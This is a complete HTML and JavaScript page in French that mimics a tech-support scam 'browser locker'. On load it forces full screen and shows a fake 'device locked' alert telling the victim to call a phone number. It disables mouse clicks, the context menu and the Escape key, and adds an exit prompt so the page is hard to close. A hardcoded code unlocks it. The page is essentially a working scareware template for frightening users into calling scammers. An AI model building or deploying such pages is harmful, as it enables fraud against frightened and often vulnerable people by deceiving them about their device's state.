<!DOCTYPE html>  
<html lang="fr">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Alerte Système Verrouillé</title>  
    <style>  
        * {  
            margin: 0;  
            padding: 0;  
            box-sizing: border-box;  
            user-select: none; /* Désactive la sélection de texte */  
        }  
        html, body {  
            width: 100vw;  
            height: 100vh;  
            background: black;  
            color: white;  
            font-family: 'Courier New', Courier, monospace;  
            text-align: center;  
            overflow: hidden; /* Empêche le défilement */  
            display: flex;  
            justify-content: center;  
            align-items: center;  
        }  
        .container {  
            display: flex;  
            flex-direction: column;  
            justify-content: center;  
            align-items: center;  
            width: 100%;  
            height: 100%;  
            padding: 5%;  
        }  
        .message {  
            font-size: 3vw; /* Taille de police réduite */  
            font-weight: bold;  
        }  
        .alert-number {  
            font-size: 2.5vw; /* Taille de police réduite */  
            font-weight: bold;  
            color: red;  
        }  
        #codeInput {  
            margin-top: 20px;  
            padding: 10px;   
            font-size: 2vw;   
            text-align: center;  
            border: 2px solid white;   
            width: 50%;  
            background: black;  
            color: white;  
            outline: none;  
        }  
        #error-message {  
            color: red;  
            font-size: 1.5vw;   
            margin-top: 10px;  
            animation: shake 0.3s;  
            display: none; /* Masquer l'erreur par défaut */  
        }  
        @keyframes shake {  
            0% { transform: translateX(0); }  
            25% { transform: translateX(-5px); }  
            50% { transform: translateX(5px); }  
            75% { transform: translateX(-5px); }  
            100% { transform: translateX(0); }  
        }  
        .blinking {  
            animation: blink 1s steps(2, start) infinite;  
        }  
        @keyframes blink {  
            50% { opacity: 0; }  
        }  
    </style>  
</head>  
<body>  
    <div class="container">  
        <div class="message">🚨 ATTENTION !</div>  
        <div class="alert-number">Votre appareil est verrouillé !</div>  
        <div class="message">📞 Appelez immédiatement le : +33 1 23 45 67 89</div> <!-- Numéro de téléphone -->  
        <div class="message">Entrez le code de déverrouillage :</div>  
        <input type="text" id="codeInput" placeholder="Code...">  
        <div id="error-message">Code incorrect !</div>  
    </div>  
    <script>  
        // Fonction pour activer le plein écran  
        function openFullscreen() {  
            let elem = document.documentElement;  
            if (elem.requestFullscreen) {  
                elem.requestFullscreen();  
            } else if (elem.mozRequestFullScreen) { // Firefox  
                elem.mozRequestFullScreen();  
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari et Opera  
                elem.webkitRequestFullscreen();  
            } else if (elem.msRequestFullscreen) { // IE/Edge  
                elem.msRequestFullscreen();  
            }  
        }  

        // Affichage d'un message d'alerte après le chargement  
        window.onload = function() {  
            openFullscreen(); // Force le mode plein écran  

            if (document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled) {  
                alert("Attention : Votre appareil est verrouillé ! Pour déverrouiller, veuillez entrer le code.");  
            } else {  
                alert("Impossible d'entrer en plein écran. Essayez de changer votre navigateur.");  
            }  

            document.getElementById('codeInput').focus(); // Focus automatique sur le champ  
            disableMouse(); // Désactivation de la souris  
            preventClose(); // Lancer la prévention de la fermeture  
        }  

        // Désactivation des événements de souris (clic gauche uniquement)  
        function disableMouse() {  
            document.addEventListener("mousemove", function(event) {  
                event.preventDefault(); // Autorise le mouvement de la souris  
            });  
            document.addEventListener("mousedown", function(event) {  
                if (event.button === 0) { // Clic gauche (0)  
                    event.preventDefault(); // Désactive le clic gauche  
                }  
            });  
            document.addEventListener("mouseup", function(event) {  
                if (event.button === 0) { // Clic gauche (0)  
                    event.preventDefault(); // Désactive le clic gauche  
                }  
            });  
            document.addEventListener("contextmenu", function(event) {  
                event.preventDefault(); // Désactive le clic droit  
            });  
        }  

        // Vérification du code  
        const correctCode = "1234"; // Code de déverrouillage  
        let inputField = document.getElementById("codeInput");  
        let errorMessage = document.getElementById("error-message");  

        inputField.addEventListener("keyup", function(event) {  
            if (event.key === "Enter") {  
                if (this.value === correctCode) {  
                    // Déverrouiller l'écran  
                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 3vw;'>Système déverrouillé avec succès !</h1>";  
                } else {  
                    // Affichage du message d'erreur  
                    errorMessage.style.display = "block";  
                    errorMessage.classList.add('blinking');  
                    this.value = ""; // Réinitialisation du champ de code  
                }  
            }  
        });  

        // Fonction pour empêcher la fermeture de la page  
        function preventClose() {  
            window.onbeforeunload = function() {  
                return "Êtes-vous sûr de vouloir quitter ?"; // Affiche un message de confirmation  
            };  
        }  

        // Bloquer les interactions avec certaines touches  
        document.addEventListener("keydown", function(event) {  
            // Enlever la fonction de la touche Échap  
            if (event.key === "Escape") {  
                event.preventDefault(); // Empêcher la touche Échap par défaut  
            }  
            // Associer la touche "9" du pavé numérique à une action  
            if (event.key === "9") {  
                // Ici, on simule l'action d'appuyer sur Échap  
                alert("La fonction Échap a été activée en appuyant sur 9 !");  
            }  
        });  
    </script>  
</body>  
</html>
